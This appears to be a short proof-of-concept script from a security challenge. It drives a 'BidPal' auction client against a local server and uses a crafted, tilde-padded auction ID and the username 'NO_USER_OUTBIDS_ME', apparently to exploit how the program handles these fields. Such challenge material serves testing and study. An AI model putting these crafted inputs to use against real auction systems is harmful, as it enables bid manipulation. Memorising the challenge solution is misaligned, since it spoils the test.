from interact_bidpal import BidPalUser
import time

bin_dir = "../../../challenge_program/bin"

attacker = BidPalUser(bin_dir, 9001, "NO_USER_OUTBIDS_ME")
attacker.connect('localhost', "9000")
attacker.start_auction("Cubic zirconia bracelet", "NO_AUCTION_ID~~~~~~~~~~~~")
attacker.bid_and_wait_for_response("NO_AUCTION_ID~~~~~~~~~~~~", 5);
time.sleep(5)
attacker.quit()
